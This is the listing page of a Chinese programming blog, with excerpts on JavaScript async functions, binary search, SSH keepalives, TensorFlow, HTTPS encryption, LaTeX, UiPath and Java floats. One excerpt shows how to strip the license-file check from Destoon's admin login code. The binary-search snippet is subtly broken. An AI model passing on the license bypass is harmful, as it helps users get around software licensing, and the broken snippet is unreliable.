<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程大白的博客">
		<meta property="og:title" content="编程大白的博客" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d885106a904ed58d6160fba8d4ee0c65/" rel="bookmark">
			async function
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这篇文章多看几遍加深理解
async function 声明定义了一个异步函数，它返回一个AsyncFunction对象。异步函数 是指通过 事件循环（event loop） 异步执行的函数，通过返回一个隐式的 Promise 作为其结果。使用异步函数的代码的语法和结构更像使用标准同步功能。（The async function declaration defines an asynchronous function, which returns an AsyncFunction object. An asynchronous function is a function which operates asynchronously via the event loop, using an implicit Promise to return its result. But the syntax and structure of your code using async functions is much more like using standard synchronous functions.
）
语法 async function name([param[, param[, ... param]]]) { statements } 参数：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d885106a904ed58d6160fba8d4ee0c65/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/175d42ec81eb3aecb322632471b01fec/" rel="bookmark">
			折半查找法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		折半查找法又称为二分查找法，这种方法对待查找的列表有两个要求：
（1）必须采用顺序存储结构
（2）必须按关键字大小有序排列
算法思想
首先，将表的中间位置记录的关键字与查找关键字比较，如果两者相等，则查找成功；否则利用中间位置记录将表分成前、后两个子表，如果中间位置记录的关键字大于查找关键字，则查找前一子表，否则查找后一子表。
重复以上过程，直到找到满足条件的记录，使查找成功，或直到子表不存在为止，此时查找不成功。
例题：列表有11个元素（6,12,15,18,22,25,28,35,46,58,60），给出使用折半查找法查找12和50的过程。
//在有序表a中折半查找等于k的元素，若找到，则函数值为该元素在表中的位置 int binSearch(int a,int k) { low=1; high=a.length; while(low&lt;=high) { mid=(low+high)/2; if(k==a[mid]) return(mid);//找到待查元素 else if(k&lt;a[mid])//未找到，则继续在前半区间查找 high=mid-1; else//继续在后半区间查找 low=mid+1; } return (0);//找不到，返回0 } java实现二分法查找
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4313ef7a29cd830a056c3698982516a4/" rel="bookmark">
			【运维】ssh卡死问题的解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 卡死是因为LIUNX安全设置问题，在一段时间内没有使用数据的情况下会自动断开，解决方法就是让本地或者服务器隔一段时间发送一个请求给对方即可
在本地打开配置文件（不建议在server端设置）
sudo apt-get install ssh sudo vim /etc/ssh/ssh_config 添加以下参数，如果有直接修改
ServerAliveInterval 50 #每隔50秒就向服务器发送一个请求 ServerAliveCountMax 3 #允许超时的次数，一般都会响应 修改完之后重启一下ssh服务
sudo /etc/init.d/ssh restart 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d73336c6c50e66f896749e22d22b1b59/" rel="bookmark">
			Tensorflow-tf.reshape()详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 TensorFlow是常用的深度学习框架，在数据准备过程中，我们常常要将数据处理成我们想要的维度，在这里就需要用到reshape语法。
与numpy的reshape类似，其基本语法为：
tf.reshape(tensor, shape, name=None) One shape dimension can be -1. In this case, the value is inferred from the length of the array and remaining dimensions.
翻译一下则为：
如果一个维度被设置为-1，那么这个分量代表的维度会被自动的计算出来。
简单来说-1就是一个缺省值，先以其他人合适，到时候总元素个数除以其他几个的乘积，我该是几就是几。
在这里通过以下几个例子就能很容易观察出来：
# tensor 't' is [1, 2, 3, 4, 5, 6, 7, 8, 9] # tensor 't' has shape [9] reshape(t, [3, 3]) ==&gt; [[1, 2, 3], [4, 5, 6], [7, 8, 9]] # tensor 't' is [[[1, 1], [2, 2]], # [[3, 3], [4, 4]]] # tensor 't' has shape [2, 2, 2] reshape(t, [2, 4]) ==&gt; [[1, 1, 2, 2], [3, 3, 4, 4]] # tensor 't' is [[[1, 1, 1], # [2, 2, 2]], # [[3, 3, 3], # [4, 4, 4]], # [[5, 5, 5], # [6, 6, 6]]] # tensor 't' has shape [3, 2, 3] # pass '[-1]' to flatten 't' reshape(t, [-1]) ==&gt; [1, 1, 1, 2, 2, 2, 3, 3, 3, 4, 4, 4, 5, 5, 5, 6, 6, 6] # -1 can also be used to infer the shape # -1 is inferred to be 9: reshape(t, [2, -1]) ==&gt; [[1, 1, 1, 2, 2, 2, 3, 3, 3], [4, 4, 4, 5, 5, 5, 6, 6, 6]] # -1 is inferred to be 2: reshape(t, [-1, 9]) ==&gt; [[1, 1, 1, 2, 2, 2, 3, 3, 3], [4, 4, 4, 5, 5, 5, 6, 6, 6]] # -1 is inferred to be 3: reshape(t, [ 2, -1, 3]) ==&gt; [[[1, 1, 1], [2, 2, 2], [3, 3, 3]], [[4, 4, 4], [5, 5, 5], [6, 6, 6]]] # tensor 't' is [7] # shape `[]` reshapes to a scalar reshape(t, []) ==&gt; 7 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee9fb53de641194e5467289ad45dc52d/" rel="bookmark">
			springcloud OpenFeign  feignclient使用传参
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		springcloud feignclient
调用接口时候的参数是Map&lt;String,Object&gt;,List&lt;Map&lt;String,String&gt;&gt;等复杂对象时候使用@RequestBody且只能有一个RequestBody带的参数，并且List中的所有元素不能是null，返回值可以是List或Map复杂对象（String是因为项目中使用aop做了登录拦截为了去掉字符串中的转义符\使用JSONObject或JSONArray转成JSON只能返回String），不能使用Get方式只能使用Post方式
调用接口时候String时候使用@RequestParam("tid") String tid或者@pathVariable可以有多个
否则使用feignclient时候报错或者controller接收不到参数
feignclient调用接口时候为了不丢失header中的cookie信息，使用添加拦截器，requestTemplate.header("Cookie","JESSIONID=13456");只能使用JESSIONID不能用自己定义的sessionId
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c95141d94025c791d5f29abe3899267/" rel="bookmark">
			HTTP协议加密
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		HTTP协议加密 1.对称加密缺点 2.非对称加密缺点 3.对称加密+非对称加密缺点 4.数字证书 1.对称加密 在每次发送真实数据之前，服务器将生成一把密钥，然后先把密钥传输给客户端。之后服务器给客户端发送真实数据之前，会用这把密钥对数据进行加密，客户端在收到加密数据之后，用刚才收到的密钥进行解密。客户端给服务器发送数据同理。
缺点 然而服务器用明文的方式传输密钥给客户端，可能会被人捕获。
2.非对称加密 让客户端与服务器都拥有一把公开的公钥，与一把保密的本人才知道的私钥；
用公钥加密的数据，只有对应的私钥才能解密；用私钥加密的数据，只有对应的公钥才能解密。
（即是两把公钥，两把私钥）
服务器给客户端传输数据之前，先用客户端明文给的公钥加密，客户端收到后用自己的私钥解密，反之同理；
缺点 非对称加密在加密的时候速度比对称加密慢上百倍
3.对称加密+非对称加密 用非对称加密的方式来传输对称加密过程中的密钥，之后就可采取对称加密。
服务器用明文的方式给客户端发送自己的公钥，客户端收到后生成一把密钥，并使用收到的公钥加密后传输给服务器，服务器用自己对应的私钥解密，就可以安全的得到了这把密钥。
缺点 当服务器以明文方式传输公钥时，公钥被截取，并发送自己的公钥给客户端；客户端发送给服务器解密后的密钥同样被截取-----------中间人即可得到密钥。
4.数字证书 客户端使用数字证书判断收到公钥是否属于服务器。
服务器在传输给客户端公钥过程中，把公钥以及服务器个人信息 Hash生出信息摘要，并且会用认证中心CA提供的私钥对信息摘要进行加密形成数字签名，再将未Hash的公钥以及服务器个人信息与数字签名合并成数字证书。
客户端拿到数字证书后，用CA提供的公钥来对数字证书中的数字签名进行解密来得到信息摘要，再对数字证书里的服务器公钥以及个人信息进行Hash得到另一份信息摘要再进行对比确定身份。
服务器一开始就需要向认证中心申请证书，没有会被标记警告，而客户端也会内置这些证书；当客户端收到服务器传输来的数据数字证书时，就将在内置证书列表中查看是否有解开该数字证书的公钥。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ab94fb4b1764d63da7d62cb78eb08d6/" rel="bookmark">
			charles 手机安装证书 chls.pro/ssl 无法打开或者无法下载文件已解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家用charles的时候肯定会需要抓去https数据,就需要在电脑和手机上安装证书.电脑安装完成之后就该手机了 复制这个域名 chls.pro/ssl 切记要复制 因为我之前一直都是自己手动输入一直不能下载文件放到safari 浏览器或者第三方浏览器,微信无效,百度搜索无效
打开之后会提示已下载,请到设置中安装
4.进去之后直接安装即可IOS10.3 以上去 设置-&gt;通用-&gt;关于本机-&gt;证书信任设置 设置信任证书 OK 证书安装完毕,电脑如何设置请参考其他人的文档,如还有问题,请评论
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69fe16503b4faddca3f58e297eac9d8a/" rel="bookmark">
			latex系列---Latex参考文献的引用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LaTeX插入参考文献，简单高效
Latex参考文献的引用
Latex中用Bibtex来引用文献
Latex能改变单独一篇参考文献字体的颜色吗？ （通过bib文件将单独一条参考文献高亮，xys亲测可用）
一、使用thebibliography标签 &lt;span style="font-size:18px;"&gt;\begin{thebibliography}{} \bibitem[显示符号]{引用标签} Book Title, Author \end{thebibliography}&lt;/span&gt; 使用情况
默认thebibliography会自动添加标题Reference，所以无需重复添加；默认参考文献的行间距为一行，这有时候显得太大了。可以在\begin{thebibliography}{}后添加\addtolength{\itemsep}{-1.5ex}来缩小行间距。-1.5ex表示每行缩小1.5ex。其实细心观察可以发现，thebibliography其实是一个枚举环境，因此对于itemize和enumerate，可以用同样的方法缩小行间距。使用thebibliography十分繁琐。需要把作者等信息一个个地填上去。有没有什么更好的方法呢？答案是：有的。那就是bibte！ 二、使用bibtex引用数据库 Step1:创建BibTex文件 （1）新建一个.txt文件；(假设为ref.txt)
（2）打开Google学术，搜索你想要引用问文献；
例如文献《Captcha: Using hard ai problems for security》，
点击“引用”； 接下出来这样的界面，点击“BibTeX”； 最后出来下面这段代码，将其复制到.txt文件中去。
（3）重复以上动作，直至将所有参考文献的上述代码都复制到了.txt文件中，最终生成的.txt文件如下所示：
（4）将.txt文件重命名为.bib文件即可。(假设生成ref.bib文件)
Step–: 在Latex文档里面添加cite包; 在Latex文档里面添加包引用：\usepackage{cite} （把这句话加在\documentclass的后面）。
(xys在使用mdpi模板过程中，并没有采用这个步骤，也是可以的)
Step2:添加引用配置 在Latex文档里面添加BibTex库的引用，要在哪里显示参考文献，就在哪里添加如下内容
（一般引用文献都在文章末尾，所以在latex中一般把下面两句放在\end{document} 之前）：
\reftitle{References}
…
…
\externalbibliography{yes}
\bibliographystyle{plain}
\bibliography{ref}
\externalbibliography{yes} 显示指示文章引用外部的bib文件
\bibliography{ref}命令用于指定之前生成的.bib库，ref就是.bib文件的名称。
其中\bibliographystyle{plain}指定参考文献的呈现方式 —常见的预设样式的可选项有8种，分别是：
plain，按字母的顺序排列，比较次序为作者、年度和标题；unsrt，样式同plain，只是按照引用的先后排序；alpha，用作者名首字母+年份后两位作标号，以字母顺序排序；abbrv，类似plain，将月份全拼改为缩写，更显紧凑；ieeetr，国际电气电子工程师协会期刊样式；acm，美国计算机学会期刊样式；siam，美国工业和应用数学学会期刊样式；apalike，美国心理学学会期刊样式；如果下载了某期刊的模板，则模板中一般会有一个.cls文件，该文件为Latex格式定义文件，例如：模板中有aaa.cls文件，那么就使用语句\bibliographystyle{aaa} xs的实际例子：在GRSL的模板中，只采用了如下两句就实现了外部bib文件的引用（只有这两句是必须的）
\bibliographystyle{IEEEtran} %IEEEtran为给定模板格式定义文件名
\bibliography{ref} %ref为.bib文件名
Step5:添加引用； 在文中添加引用，引用格式如下：
\cite{引用文章名称}
例如： \cite{Wille1982}
“引用文章名称” 就是前边定义bib文件中的@article后面的名称.
step6： 编译生成Reference 在真正生成主文档之前，一定要注意，首先，设置主文档
选项–设置当前文档为主文档（软件也会自动检测到哪个是主文档）
注意：如果不进行这个步骤，后面的设置都不能实现！！！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/69fe16503b4faddca3f58e297eac9d8a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c26b5542a1c03c1026ef225d9f433ee/" rel="bookmark">
			更改PVE登录IP管理地址
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		更改PVE登录IP管理地址
/etc/network/interfaces
/etc/issue
/etc/hosts
更改以上文件相对应的地址即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9dcb43b45cbcd4ea15229b2b6092848/" rel="bookmark">
			Visual Studio 输出目录&amp;中间目录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当解决方案中有多个工程时，合理配置工程的“输出目录”及“中间目录”，能够方便代码的管理。
输出目录
$(SolutionDir)bin/$(Platform)/$(Configuration) 中间目录
$(SolutionDir)temp/$(Platform)/$(Configuration)/$(ProjectName) 执行结果
“SocketLesson”是解决方案，“01-HelloSocket”、“02-Server”、“02-Client”是工程项目。上述三个项目编程和运行生成的结果存储在“bin”和“temp”文件夹中。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6df0512d6062267a5ebef6a4de13c3b9/" rel="bookmark">
			UiPath文本操作Get Text的介绍和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、Get Text操作的介绍
从指定的UI元素提取文本值
二、Get Text在UiPath中的使用
打开设计器，在设计库中新建一个Sequence，为序列命名及设置Sequence存放的路径，然后在Activities中搜索open browser，并将其拖至设计区，且设置打开网站，运行该流程“https://www.baidu.com/”
在Activities中搜索设置文本（set text），并将其拖至设计区，设置输入text为“uipath”，继续在Activities中搜索click，设置点击元素为“百度一下”，运行该流程
在Activities中搜索设置文本（set text），并将其拖至设计区，设置输入text为“uipath”，继续在Activities中搜索click，设置点击元素为“百度一下”，运行该流程
#设置变量text获取文本值
在Activities中搜索 log message，并将其拖至设计区，输入变量text，运行流程
#运行完成，你会看到日志窗口打印了从页面获取的文本信息
总结：以上流程就用到了获取文本（get text）的操作
UiPath交流群:465630324 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f6ef759d9a4779b36188754c5547c3f7/" rel="bookmark">
			UiPath键盘操作的介绍和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、键盘操作的介绍
模拟用户使用键盘操作的一种行为：
例如使用发送热键（Sendhotkey），输入信息 （Typeinto）的操作
二、键盘操作在UiPath中的使用
1.打开设计器，在设计库中新建一个Sequence，为序列命名及设置Sequence存放的路径
2.在Activities中搜索open browser，并将其拖至设计区，且设置打开网站，运行该流程“https://www.baidu.com/”
3.在Activities中搜索 输入信息 （Typeinto），并将其拖至设计区，拾取百度搜索的输入框且设置键盘输入的文本为"机器人"
#拾取区域，红色框选区域
4.在Activities中搜索 发送热键 （Sendhotkey），并将其拖至设计区，选择enter按键
#运行完成，你会看到搜索框输入了”uipath”，并且进行了回车搜索
总结：以上流程就用到了键盘的操作-发送热键（Sendhotkey），输入信息 （Typeinto）
UiPath交流群:465630324
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09521673a8e52ae104c789b7907b7ff3/" rel="bookmark">
			{&#34;无法加载 DLL“ArcGISVersion.dll”: 找不到指定的模块。 (异常来自 HRESULT:0x8007007E)。&#34;}
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		{“无法加载 DLL“ArcGISVersion.dll”: 找不到指定的模块。 (异常来自 HRESULT:0x8007007E)。”}
可以在：
项目属性-生成-目标平台改为x86就好了
具体步骤如下：
OK！！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16bb0029b8d45f729ec2c8100d068977/" rel="bookmark">
			UiPath鼠标操作文本的介绍和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、鼠标（mouse）操作的介绍
模拟用户使用鼠标操作的一种行为，例如单击，双击，悬浮。根据作用对象的不同我们可以分为对元素的操作、对文本的操作和对图像的操作
二、鼠标对文本的操作在UiPath中的使用
1.打开设计器，在设计库中新建一个Sequence，为序列命名及设置Sequence存放的路径
2.在Activities中搜索open browser，并将其拖至设计区，且设置打开网站，运行该流程“https://www.baidu.com/”
3. 在Activities中搜索mouse，并将text(文本)下的click text拖至设计区，且设置单击的文本为“hao123”，拾取的对象为菜单栏整个区域，再次运行改流程（run file），进入hao123网页界面
#拾取区域，红色框选区域
4. 在Activities中搜索mouse，并将text(文本)下的double
click text拖至设计区，且设置单击的文本为“人民网”，拾取的对象为菜单栏整个区域，再次运行改流程（runfile），进入“人民网”页面
#拾取区域
5. 在Activities中搜索mouse，并将text(文本)下的hover text拖至设计区，且设置单击的文本为“法治”，拾取的对象为菜单栏整个区域，再次运行改流程（run file）
#拾取区域
#运行完成，鼠标会悬浮于“法治”中间
UiPath交流群:465630324
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c29912ac5292814325b171ace309ec1/" rel="bookmark">
			量化交易，关于止损止盈的一点思考
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何设置止损止盈指标才能达到 "使损失基本稳定，让盈利充分攀升" ，
止损位设置
如果当天可以卖出，止损位就是成本*（1-X），如x设为5%，就是股价跌5%就止损，一般就是5%略多一点损失（略多一点是因为可能需要降价保证抛出和交易成本），如果考虑交易成本，可以给止损位打个折扣，例如，期望5%的损失，止损位可以设置在4.8%左右
止盈位设置
设置止盈既要防止利润被下跌抹掉，又要充分接近最近一个时期最高价，如果股票上涨脱离成本区，可以设最近一段时间内最高价（（比如，一周，一月））*（1-x），如x可以设为5%，就是当股价达到当天前一周之内最高价95%时，可以抛出，确保利润。这种设置，可以在持续攀升时，止盈位不断自动上调，直到产生一定幅度以上的调整 这样止盈止损位设计很容易由系统实现，自动生成每个时间点上的止盈和止损位，并可以根据风险承受能力调整。
实战：
止损位设置，仍然存在一些风险不能cover
1 比如由于T+1交易，当天买入股票隔日才能抛售，买入后的风险止损位不能cover，这时可以考虑采取下午接近收盘时买入的策略，回避当天下跌风险。
2 跌停无法抛出，本质上讲，容易跌停股票，短期流动性相对比较差，可以选择流动性较好的股票进行买入回避风险； 简单写一点，抛砖引玉
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c27ce8394ec92385bd52d3ac9a45555/" rel="bookmark">
			关于java浮点数的一些问题，BigDecimal的累加
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		事情的起因 有这么两组数：
a ：83.86 71.81 69.3 65.49 79.03 380.57
b：2.52 2.15 2.08 1.96 2.37 380.57
在计算数组a[i]+b[i]累加的过程中遇到这个问题
float[] money = {(float) 83.86, (float) 71.81, (float) 69.3, (float) 65.49, (float) 79.03}; float[] tax = {(float) 2.52, (float) 2.15, (float) 2.08, (float) 1.96, (float) 2.37}; float c = 0; for (int i = 0; i &lt; money.length; i++) { c+=money[i]+tax[i]; } System.out.println(c); 打印结果 380.56998，非常离谱，纯加操作怎么不可能把最多小数点后两位的数加成小数点后五位。一开始想的主要原因是因为第一组数里面夹杂这一个只有一位小数的。果不其然，每一次循环打印一次结果
86.38
160.34
231.72
299.16998
380.56998
第三次循环加出的问题，然后网上找了一大堆资料，最初的想得是强制保留两位于是👇
float[] money = {(float) 83.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c27ce8394ec92385bd52d3ac9a45555/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21df5d193f16c7e74b2ec45804f6ac6d/" rel="bookmark">
			swagger 配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 package com.basetnt.bss; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import springfox.documentation.builders.ApiInfoBuilder; import springfox.documentation.builders.PathSelectors; import springfox.documentation.builders.RequestHandlerSelectors; import springfox.documentation.service.ApiInfo; import springfox.documentation.spi.DocumentationType; import springfox.documentation.spring.web.plugins.Docket; import springfox.documentation.swagger2.annotations.EnableSwagger2; @Configuration @EnableSwagger2 public class Swagger2 { @Bean public Docket createRestApi() { Docket docket = new Docket(DocumentationType.SWAGGER_2) .apiInfo(apiInfo()) .select() .apis(RequestHandlerSelectors.basePackage("com.basetnt.bss.controller")) .paths(PathSelectors.any()) .build(); docket.forCodeGeneration(true); return docket; } private ApiInfo apiInfo() { return new ApiInfoBuilder() .title("bss api") .description("bss API list") .version("1.0") .build(); } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/608653db8fed834f1d289d6a5cbba8d7/" rel="bookmark">
			python xlwt 写入Excel
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介：
将数据写入Microsoft Excel中，可使用xlwt,其官网：xlwt · PyPI
安装命令：
pip/pip3 install xlwt 简单的应用如下：
#!/usr/bin/python # -*- coding: UTF-8 -*- import xlwt # 添加设置默认编码，避免：UnicodeEncodeError: 'ascii' codec can't encode characters ... import sys reload(sys) sys.setdefaultencoding('utf-8') # 样式相关 def CreateStyle(rowx, colx, value): # 初始化样式 style = xlwt.XFStyle() font = xlwt.Font() # 设置字体 alignment = xlwt.Alignment() # 设置排列格式 borders = xlwt.Borders() # 设置边框 pattern = xlwt.Pattern() # 设置背景颜色 if rowx == 0: font.name = u'华文彩云' elif rowx == 1: if colx%2 == 0: font.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/608653db8fed834f1d289d6a5cbba8d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/79dfcee03a113b008d68a387fa6a265b/" rel="bookmark">
			Python使用reportlab生成带有图片的pdf
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 reportlab是一个很好用的Python第三方库，可惜文档是纯英文的。下面是一个导出图片的简单示例 # -*- coding: utf-8 -*- from reportlab.platypus import Image from reportlab.pdfgen import canvas def to_pdf(response, url_list=None): can = canvas.Canvas(response) url_list.sort(key=lambda x: x['page_num']) for url in url_list: image_url = url['image_url'] image = Image(image_url) image_height = image.drawHeight image_width = image.drawWidth can.setPageSize((image_width, image_height)) can.drawImage(image_url, 0, 0, image_width, image_height, 'auto') can.showPage() can.save() return response if __name__ == "__main__": urls = [ {"page_num":2 ,"image_url": "image_url"}, {"image_url": "image_url", 'page_num': 1} ] port = to_pdf('test.pdf', urls) 参考文档 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91a2ca9639e99e990ce66ec73e94607c/" rel="bookmark">
			Destoon7访问后台出现“请检查网站根目录下 license.txt”
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天在访问使用destoon的制作的网站www.fykou.com/admin.php后台时，网站突然之间提示“请检查网站根目录下 license.txt”，但是在网站的根目录里根本没有license.txt这个文件（为了网站安全性，已经删除了），所以就去网站的后台找，默认为admin文件夹！
网站后台文件默认为admin.php，可以修改，但是文件在admin文件夹下面。
修改方法：
文件：admin/login.inc.php（前几行）
defined('DT_ADMIN') or exit('Access Denied'); $DT_LICENSE = md5(file_get(DT_ROOT.'/license.txt')); $DT_LICENSE == '0f974f89aa216d38ed232b0ccb957614' or msg('网站根目录license.txt不允许修改或删除，请检查'); 将本代码改为：
defined('DT_ADMIN') or exit('Access Denied'); 这样，网站后台就能正常访问。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73df58e268d29fb5527a30493c842720/" rel="bookmark">
			算法--接雨水问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一想又好久没更新文章了。唉，初次体验到一种像是被人赶稿的感觉。。。不过既然决定要写博客就一定要坚持下去。。。。。所以今天写点啥呢。。。要不就写一个简单点的算法吧。。。于是就找到了这道题。。。（为啥要打这么多’。'呢。。。欸好像又下意识的打出来了）
所以不说废话了进入正题👇
Leetcode-42接雨水问题 题干：给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。
上面是由数组 [0,1,0,2,1,0,1,3,2,1,2,1] 表示的高度图，在这种情况下，可以接 6 个单位的雨水（蓝色部分表示雨水）。 感谢 Marcos 贡献此图。
来源：力扣（LeetCode）
链接：https://leetcode-cn.com/problems/trapping-rain-water
那一看到题干，脑子里必然本源的想到一种暴力方法，从左往右扫描，记录位差。
从左面第一个非零的开始记录，第一个是1，然后往右扫描。遇到比这个记录点大的点位更新记录点计算两点之间的差说的比较含糊，且表述可能还有点不正确，不过问题不大，这里面涉及到很多情况，简单来讲暴力方案一般不采取。。。 所以呢思考一下正确解法
实力有限所以采用官方题解的图
从左扫描一次（左上图），再从右扫描一次（右上图）计算出整个左加右的大小（下图）称为总大小我们把原来的大小称为原大小，即题干图里面的黑色部分（数组累加）我们用总大小-原大小-重合部分（下图虚线部分）即为所求这样的时间复杂度为O（n） 附上java代码
public class Solution { public int Max(int a,int b){ return a&gt;b?a:b; } public int trap(int[] height) { //注意这个空数组是个坑 if (height.length&lt;=0) return 0; int[] left = new int[height.length]; int[] right = new int[height.length]; int height_sum = height[0]; //重合部分 int sum = 0; //总大小 int max_sum; //一个标记用于计算总大小 //总大小等于数组长度*数组中最大的元素 int max_flag; left[0] = height[0]; right[height.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73df58e268d29fb5527a30493c842720/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/831be7c01001207ced29a4d2d4c5b518/" rel="bookmark">
			无限循环输入任意10个整数，然后将这10个整数数列按照奇数在前、偶数在后的顺序重新排放。并要求奇偶两部分都是升序排列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		方法一 #include &lt;stdio.h&gt; int main() { int a[10]; int b,c; int i,j,z; int temp; while(1) { b = 0;//统计奇数 c = 9;//统计偶数 printf("请输入10个数:"); for(i = 0;i &lt; 10;i ++) { scanf("%d",&amp;a[i]); if(a[i] % 2 != 0) { b ++; } else { c --; } } for(i = 0;i &lt; b;i ++) { for(j = 9;j &gt; c;j --) { if(a[i] % 2 == 0 &amp;&amp; a[j] != 0) { temp = a[i]; a[i] = a[j]; a[j] = temp; } } } //排奇数:冒泡排序 for(i = 0;i &lt; b - 1;i ++) { for(j = 0;j &lt; b - i - 1;j ++) { if(a[j] &gt; a[j + 1]) { temp = a[j]; a[j] = a[j + 1]; a[j + 1] = temp; } } } //排偶数:冒泡排序 for(i = 0;i &lt; c;i ++) { for(j = c + 1;j &lt; 10 - i - 1;j ++) { if(a[j] &gt; a[j + 1]) { temp = a[j]; a[j] = a[j + 1]; a[j + 1] = temp; } } } // //打印 for(i = 0;i &lt; 10;i ++) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/831be7c01001207ced29a4d2d4c5b518/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7132f705fbfd903fe5262a26afd5bd57/" rel="bookmark">
			迪文屏幕T5UID3平台学习笔记三：判定按下和抬起动作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先说功能需求，就是我有个按钮，需要判定用户是否有按下和抬起动作，已达到手动控制
某个开关开启时间的目的。
先看手册：
根据以上内容，就可以实现我要的功能，于是我按着历程，区实验，确实实现了我要的功能，
但是有个很大的问题，就是当我的OS编译代码超过1.8K时候，这个按键就失灵了，实验了各种
